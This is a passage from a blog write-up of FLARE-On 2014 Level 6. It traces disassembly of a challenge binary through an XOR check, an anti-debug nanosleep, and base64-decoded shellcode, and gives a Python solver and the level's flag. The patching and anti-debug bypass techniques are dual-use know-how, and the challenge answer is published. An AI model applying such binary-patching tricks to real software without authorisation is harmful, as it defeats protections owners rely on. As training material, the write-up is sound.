<span style="color: #93A1A1">.text:0000000000437151</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">arg1_2</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:0000000000437158</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">counter_?</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:000000000043715</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">movsxd</span>  <span style="color: #B58900">rdx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">edx</span>
<span style="color: #93A1A1">.text:0000000000437161</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">rdx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">arg1_2</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:0000000000437168</span> <span style="color: #268BD2">movzx</span>   <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rdx</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:000000000043716</span><span style="color: #268BD2">B</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">56h</span>             <span style="color: #586E75">; xor with 0x56</span>
<span style="color: #93A1A1">.text:000000000043716</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">dl</span>
<span style="color: #93A1A1">.text:0000000000437170</span> <span style="color: #268BD2">add</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">counter_?</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">1</span>
<span style="color: #586E75">; jumps back to top</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We see another <code>repne scasb</code>. We have seen these instructions before. At the end of the code snippet, we go back to the top (notice the offsets for first and last line). This code loops through first argument and xors it with <code>0x56</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>loc_437177</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">for</span> <span style="color: #93A1A1">(</span><span style="color: #DC322F">int</span> <span style="color: #93A1A1">i</span><span style="color: #719e07">=</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">i</span><span style="color: #719e07">&lt;</span><span style="color: #2AA198">11</span> <span style="color: #93A1A1">;</span> <span style="color: #93A1A1">i</span><span style="color: #719e07">++</span><span style="color: #93A1A1">)</span> 
<span style="color: #93A1A1">{</span> 
  <span style="color: #93A1A1">arg1[i]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">arg1[i]</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0x56</span><span style="color: #93A1A1">;</span> 
<span style="color: #93A1A1">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>If the loop is done, the <code>jnz</code> in line 19 will not be triggered and we land somewhere else.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Comparison</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">C1</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">arg1_2</span><span style="color: #93A1A1">]</span> <span style="color: #586E75">; arg1 xor 0x56</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">C8</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0Ah</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">CD</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esi</span><span style="color: #93A1A1">,</span> <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aBngcgDebd</span> <span style="color: #586E75">; &quot;bngcg`debd&quot;</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">D2</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rdi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rax</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">D5</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_400370</span>       <span style="color: #586E75">; func(arg1 xor 0x56, hexlify(bngcg`debd) )</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">DA</span> <span style="color: #268BD2">test</span>    <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>         <span style="color: #586E75">; if function is successful, will return 0</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">DC</span> <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_4371F2</span> <span style="color: #586E75">; jumps if return value = 0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Application loads the string <code>bngcg`debd</code> and compares the result of <code>arg1 xor 0x56</code> with it. If both are equal, <code>jz</code> in line 7 will be taken.<br />
We have already seen the transitive property of xor so we can calculate the correct value of first argument which is <code>4815162342</code>. We could also patch the <code>jz</code> to <code>jmp</code> and enter any 10 characters for argument one.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>First argument</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">arg1</span> <span style="color: #93A1A1">xor</span> <span style="color: #2AA198">0x56</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;bngcg`debd&quot;</span>
<span style="color: #93A1A1">arg1</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;bngcg`debd&quot;</span> <span style="color: #93A1A1">xor</span> <span style="color: #2AA198">0x56</span>
<span style="color: #93A1A1">arg1</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;4815162342&quot;</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Now it gets a bit hazy and very painful. There are tons of loops and function calls. Some random strings are loaded in different functions and not used for anything. I started to see patterns such as this instruction <code>mov  cs:byte_729AC2, al</code>. At that address, there are bytes being written and they are in <code>base64</code>. I was stepping through until suddenly everything stopped and I saw that a <code>nanosleep</code> syscall was executed.</p>

<p><img src="/images/2014/flare/6-2.jpg" alt="nanosleep" title="nanosleep" /></p>

<p>I patched it and continued. Application crashed a few times in between and I had to get back to my latest breakpoint. I got into the habit of copying the base64 bytes and setting up breakpoints every once in a while to get back to a checkpoint after each crash. Finally all the bytes were written and <a href="https://twitter.com/FireEye/status/496757071644487680" target="_blank">sub_401164</a> was called. This function decodes the bytes from base64 (although I though it is a different implementation and stepped through it for an hour before realizing that it is just a standard decoder).</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Checking argument 2</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC39C</span>  <span style="color: #586E75">; ---------------------------------------------------------------------------</span>

<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC39C</span>  <span style="color: #268BD2">loc_7FFF3A5AC39C</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC39C</span>  <span style="color: #268BD2">ror</span>     <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0F2h</span>            <span style="color: #586E75">; arg2[0] ror 0xF2 == 0x1B</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC39F</span>  <span style="color: #268BD2">cmp</span>     <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">1Bh</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3A2</span>  <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_7FFF3A5AC3A6</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3A4</span>  <span style="color: #268BD2">jmp</span>     <span style="color: #B58900">rbx</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3A6</span>  <span style="color: #586E75">; ---------------------------------------------------------------------------</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3A6</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3A6</span>  <span style="color: #268BD2">loc_7FFF3A5AC3A6</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3A6</span>  <span style="color: #268BD2">add</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3AA</span>  <span style="color: #268BD2">xor</span>     <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">40h</span>             <span style="color: #586E75">; arg2[1] xor 0x40 xor 0xF2 xor 0xB3 == 0x30</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3AD</span>  <span style="color: #268BD2">xor</span>     <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0F2h</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3B0</span>  <span style="color: #268BD2">xor</span>     <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0B3h</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3B3</span>  <span style="color: #268BD2">cmp</span>     <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">30h</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3B6</span>  <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_7FFF3A5AC3BA</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">stack</span><span style="color: #93A1A1">]:</span><span style="color: #2AA198">00007</span><span style="color: #268BD2">FFF3A5AC3B8</span>  <span style="color: #268BD2">jmp</span>     <span style="color: #B58900">rbx</span>
<span style="color: #268BD2">...</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>This is obviously shellcode, pushed to the stack and called. Bytes of the second argument are manipulated and then compared with some hardcoded value. I have only included the first 2 bytes here. For example <code>arg2[0] ror 0xF2 must equal 0x1B</code>, otherwise <code>jz</code> will be called and application will terminate in <code>loc_7FFF3A5AC3A6</code>. I saw around 30 checks meaning that argument 2 must be 30 bytes or so. I wrote the following Python code to calculate the second argument.</p>

<p>Python does not have <code>ror</code> and <code>rol</code> binary operators so I stole them from <a href="http://www.falatic.com/index.php/108/python-and-bitwise-rotation" target="_blank">here</a>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Second argument</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #586E75"># rol and ror implementations taken from </span>
<span style="color: #586E75"># http://www.falatic.com/index.php/108/python-and-bitwise-rotation</span>

<span style="color: #586E75"># Rotate left: 0b1001 --&gt; 0b0011</span>
<span style="color: #93A1A1">rol</span> <span style="color: #719e07">=</span> <span style="color: #719e07">lambda</span> <span style="color: #93A1A1">val,</span> <span style="color: #93A1A1">r_bits,</span> <span style="color: #93A1A1">max_bits</span><span style="color: #719e07">=</span><span style="color: #2AA198">8</span><span style="color: #93A1A1">:</span> \
    <span style="color: #93A1A1">(val</span> <span style="color: #719e07">&lt;&lt;</span> <span style="color: #93A1A1">r_bits</span><span style="color: #719e07">%</span><span style="color: #93A1A1">max_bits)</span> <span style="color: #719e07">&amp;</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #719e07">**</span><span style="color: #93A1A1">max_bits</span><span style="color: #719e07">-</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">|</span> \
    <span style="color: #93A1A1">((val</span> <span style="color: #719e07">&amp;</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #719e07">**</span><span style="color: #93A1A1">max_bits</span><span style="color: #719e07">-</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">))</span> <span style="color: #719e07">&gt;&gt;</span> <span style="color: #93A1A1">(max_bits</span><span style="color: #719e07">-</span><span style="color: #93A1A1">(r_bits</span><span style="color: #719e07">%</span><span style="color: #93A1A1">max_bits)))</span>
 
<span style="color: #586E75"># Rotate right: 0b1001 --&gt; 0b1100</span>
<span style="color: #93A1A1">ror</span> <span style="color: #719e07">=</span> <span style="color: #719e07">lambda</span> <span style="color: #93A1A1">val,</span> <span style="color: #93A1A1">r_bits,</span> <span style="color: #93A1A1">max_bits</span><span style="color: #719e07">=</span><span style="color: #2AA198">8</span><span style="color: #93A1A1">:</span> \
    <span style="color: #93A1A1">((val</span> <span style="color: #719e07">&amp;</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #719e07">**</span><span style="color: #93A1A1">max_bits</span><span style="color: #719e07">-</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">))</span> <span style="color: #719e07">&gt;&gt;</span> <span style="color: #93A1A1">r_bits</span><span style="color: #719e07">%</span><span style="color: #93A1A1">max_bits)</span> <span style="color: #719e07">|</span> \
    <span style="color: #93A1A1">(val</span> <span style="color: #719e07">&lt;&lt;</span> <span style="color: #93A1A1">(max_bits</span><span style="color: #719e07">-</span><span style="color: #93A1A1">(r_bits</span><span style="color: #719e07">%</span><span style="color: #93A1A1">max_bits))</span> <span style="color: #719e07">&amp;</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #719e07">**</span><span style="color: #93A1A1">max_bits</span><span style="color: #719e07">-</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">))</span>

<span style="color: #93A1A1">arg2</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">[]</span>
<span style="color: #719e07">for</span> <span style="color: #93A1A1">x</span> <span style="color: #719e07">in</span> <span style="color: #B58900">range</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">32</span><span style="color: #93A1A1">):</span>
    <span style="color: #93A1A1">arg2</span><span style="color: #719e07">.</span><span style="color: #93A1A1">insert(x,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol(</span><span style="color: #2AA198">0x1B</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0xF2</span><span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0x40</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0xF2</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0xB3</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0x30</span><span style="color: #93A1A1">)</span> 

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0x1F</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0x71</span><span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">3</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span>  <span style="color: #93A1A1">rol(</span><span style="color: #2AA198">0xB0</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0xBC</span><span style="color: #93A1A1">)</span>  <span style="color: #719e07">-</span> <span style="color: #2AA198">0xA3</span> 

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">4</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span>  <span style="color: #93A1A1">(</span> <span style="color: #2AA198">0xE8</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0x79</span> <span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">5</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol(</span> <span style="color: #2AA198">0xf6</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0x28</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x82</span><span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">6</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol(</span> <span style="color: #2AA198">0x1f</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x2c</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x4d</span> <span style="color: #93A1A1">)</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0xb0</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">7</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">ror(</span> <span style="color: #93A1A1">rol(</span><span style="color: #2AA198">0xAF</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x3F</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x2A</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0xb8</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x99</span> <span style="color: #93A1A1">)</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x54</span> 

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">8</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol(</span> <span style="color: #2AA198">0x5D</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0xBA</span> <span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">9</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol(</span><span style="color: #2AA198">0x29</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x30</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x6C</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0xED</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">10</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0xb5</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0xbf</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">11</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">ror(ror(</span><span style="color: #2AA198">0xa5</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x63</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0x31</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x7b</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x8c</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0xbc</span><span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">12</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">ror</span> <span style="color: #93A1A1">(</span> <span style="color: #93A1A1">ror</span> <span style="color: #93A1A1">(</span> <span style="color: #93A1A1">ror</span> <span style="color: #93A1A1">(</span> <span style="color: #2AA198">0xf3</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x98</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0xAE</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x16</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x20</span><span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">13</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol</span> <span style="color: #93A1A1">(</span> <span style="color: #2AA198">0xa6</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0xD2</span>  <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x6E</span> <span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">14</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0x62</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x34</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">15</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0x32</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0xB2</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x62</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0x10</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0xCD</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">16</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol</span> <span style="color: #93A1A1">(</span> <span style="color: #2AA198">0xEB</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x07</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0x73</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0xB7</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">17</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol</span> <span style="color: #93A1A1">(</span> <span style="color: #2AA198">0x0B</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0x4C</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x5B</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x36</span> <span style="color: #93A1A1">)</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0x61</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x34</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">18</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0x9A</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x5A</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">19</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">rol(</span><span style="color: #2AA198">0x99</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0xa2</span><span style="color: #93A1A1">)</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">20</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0x2B</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0xE7</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0x7E</span>

<span style="color: #93A1A1">arg2[</span><span style="color: #2AA198">21</span><span style="color: #93A1A1">]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">(</span> <span style="color: #93A1A1">(</span> <span style="color: #93A1A1">rol(</span> <span style="color: #93A1A1">ror(</span><span style="color: #2AA198">0xAF</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x57</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">,</span> <span style="color: #2AA198">0x4A</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">-</span> <span style="color: #2AA198">0x4E</span> <span style="color: #93A1A1">)</span> <span style="color: #719e07">^</span> <span style="color: #2AA198">0x86</span> <span style="color: #93A1A1">)</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">0xb8</span>

<span style="color: #586E75"># stopped after @fla</span>

<span style="color: #719e07">for</span> <span style="color: #93A1A1">index,</span> <span style="color: #93A1A1">item</span> <span style="color: #719e07">in</span> <span style="color: #B58900">enumerate</span><span style="color: #93A1A1">(arg2):</span>
    <span style="color: #93A1A1">arg2[index]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">item</span> <span style="color: #719e07">&amp;</span> <span style="color: #2AA198">0xFF</span>

<span style="color: #719e07">print</span> <span style="color: #2AA198">&#39;&#39;</span><span style="color: #719e07">.</span><span style="color: #93A1A1">join(</span><span style="color: #B58900">map</span><span style="color: #93A1A1">(</span><span style="color: #B58900">chr</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">arg2))</span>

<span style="color: #586E75"># output</span>
<span style="color: #93A1A1">l1nhax</span><span style="color: #719e07">.</span><span style="color: #93A1A1">hurt</span><span style="color: #719e07">.</span><span style="color: #93A1A1">u5</span><span style="color: #719e07">.</span><span style="color: #93A1A1">a1l</span><span style="color: #268BD2">@flaZZZZZZZZZZ</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Thanks <a href="https://twitter.com/Wartortell" target="_blank">@Wartortell</a>.</p>

<h4 id="level-6-flag-l1nhax-hurt-u5-a1l-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7">Level 6 flag: l1nhax.hurt.u5.a1l@flare-on.com</h4>

<hr />

<h2 id="a-name-ch7-a-challenge-7-the-doge-strikes-back:94bf06dd1bee42f6b34a1ff79274f7e7"><a name="ch7"></a> Challenge 7 - The Doge Strikes Back</h2>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">Alright! Last one, can you get to the finish line? Keep it up!
-FLARE
</pre></div>

